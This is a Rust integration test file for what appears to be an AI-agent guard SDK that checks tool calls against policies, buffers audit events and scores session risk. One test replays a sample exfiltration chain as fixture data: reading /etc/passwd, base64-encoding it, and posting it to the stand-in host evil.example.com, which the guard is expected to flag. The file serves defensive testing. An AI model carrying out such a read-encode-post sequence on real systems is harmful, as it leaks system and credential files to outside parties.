use axiomguard_sdk::{
    DecisionType, Guard, GuardConfig, GuardConfigBuilder, AgentPolicy, ToolPermission,
    session::AuditEventReplay,
};
use std::collections::HashMap;

fn test_config_with_session(session_id: &str) -> GuardConfig {
    GuardConfigBuilder::default()
        .tenant_id("tenant-int")
        .agent_id("agent-int")
        .session_id(session_id.to_string())
        .build()
        .unwrap()
}

fn test_config_no_session() -> GuardConfig {
    GuardConfigBuilder::default()
        .tenant_id("tenant-int")
        .agent_id("agent-int")
        .build()
        .unwrap()
}

fn deny_policy() -> AgentPolicy {
    let mut tool_allowlist = HashMap::new();
    tool_allowlist.insert("dangerous_tool".to_string(), ToolPermission::Deny);
    let now = chrono::Utc::now().timestamp();

    AgentPolicy {
        agent_id: "agent-int".to_string(),
        tool_allowlist,
        rules: Vec::new(),
        risk_threshold: 0.7,
        quota: None,
        fetched_at: now,
        expires_at: now + 3600,
    }
}

#[tokio::test]
async fn test_full_audit_trail() {
    let guard = Guard::new(test_config_no_session());
    guard.load_policy(deny_policy());

    let r1 = guard.check("safe_tool", &serde_json::json!({"path": "/tmp/a"})).await.unwrap();
    assert_eq!(r1.decision, DecisionType::Allow);

    let r2 = guard.check("dangerous_tool", &serde_json::json!({})).await.unwrap();
    assert_eq!(r2.decision, DecisionType::Block);

    let r3 = guard.check("safe_tool", &serde_json::json!({"path": "/tmp/b"})).await.unwrap();
    assert_eq!(r3.decision, DecisionType::Allow);

    let events = guard.flush_audit();
    assert_eq!(events.len(), 3, "expected 3 audit events after 3 check() calls");

    assert_eq!(events[0].decision, DecisionType::Allow);
    assert_eq!(events[1].decision, DecisionType::Block);
    assert_eq!(events[2].decision, DecisionType::Allow);

    assert_eq!(events[0].tool_name, "safe_tool");
    assert_eq!(events[1].tool_name, "dangerous_tool");
    assert_eq!(events[2].tool_name, "safe_tool");

    let after_flush = guard.flush_audit();
    assert!(after_flush.is_empty(), "buffer should be empty after flush");
}

#[tokio::test]
async fn test_session_hydration_parity() {
    let events = vec![
        AuditEventReplay {
            sequence: 1,
            tool_name: "read_file".to_string(),
            args: serde_json::json!({"path": "/etc/passwd"}),
            decision: DecisionType::Allow,
            timestamp: 0,
            processing_time_us: 50,
            reason: "ok".to_string(),
            matched_rules: vec![],
        },
        AuditEventReplay {
            sequence: 2,
            tool_name: "exec".to_string(),
            args: serde_json::json!({"cmd": "base64 /etc/passwd"}),
            decision: DecisionType::Allow,
            timestamp: 0,
            processing_time_us: 60,
            reason: "ok".to_string(),
            matched_rules: vec![],
        },
        AuditEventReplay {
            sequence: 3,
            tool_name: "http_post".to_string(),
            args: serde_json::json!({"url": "https://evil.example.com", "payload": "base64"}),
            decision: DecisionType::Block,
            timestamp: 0,
            processing_time_us: 120,
            reason: "blocked".to_string(),
            matched_rules: vec!["exfiltration".to_string()],
        },
    ];

    let mut live = axiomguard_sdk::session::SessionTracker::new(
        Some("session-1".to_string()),
        "tenant-int".to_string(),
        "agent-int".to_string(),
    );
    for e in &events {
        live.record_tool_call(&e.tool_name, &e.args, e.decision);
    }
    let live_risk = live.risk_score();
    let live_calls = live.total_calls();

    let mut hydrated = axiomguard_sdk::session::SessionTracker::new(
        Some("session-1".to_string()),
        "tenant-int".to_string(),
        "agent-int".to_string(),
    );
    hydrated.hydrate_from_events(&events);
    let hydrated_risk = hydrated.risk_score();
    let hydrated_calls = hydrated.total_calls();

    assert_eq!(live_calls, hydrated_calls, "total_calls must match after hydration");
    assert_eq!(live_calls, 3, "expected 3 total calls");
    assert!(
        (live_risk - hydrated_risk).abs() < 1e-6,
        "risk scores must match: live={}, hydrated={}",
        live_risk, hydrated_risk
    );
    assert!(hydrated_risk >= 0.8, "risk should detect exfiltration pattern");
}

#[tokio::test]
async fn test_backward_compatibility() {
    let config = GuardConfigBuilder::default()
        .tenant_id("tenant-compat")
        .agent_id("agent-compat")
        .build()
        .unwrap();

    let guard = Guard::new(config);

    let result = guard.check("some_tool", &serde_json::json!({"arg": "value"})).await.unwrap();
    assert_eq!(result.decision, DecisionType::Allow);
    assert!(!result.cached);

    let events = guard.flush_audit();
    assert_eq!(events.len(), 1);
}

#[tokio::test]
async fn test_flush_audit_drains_and_replenishes() {
    let guard = Guard::new(test_config_no_session());

    let _ = guard.check("tool_a", &serde_json::json!({"x": 1})).await.unwrap();
    let _ = guard.check("tool_b", &serde_json::json!({"y": 2})).await.unwrap();

    let batch1 = guard.flush_audit();
    assert_eq!(batch1.len(), 2);

    let _ = guard.check("tool_c", &serde_json::json!({"z": 3})).await.unwrap();

    let batch2 = guard.flush_audit();
    assert_eq!(batch2.len(), 1);

    assert!(guard.flush_audit().is_empty());
}
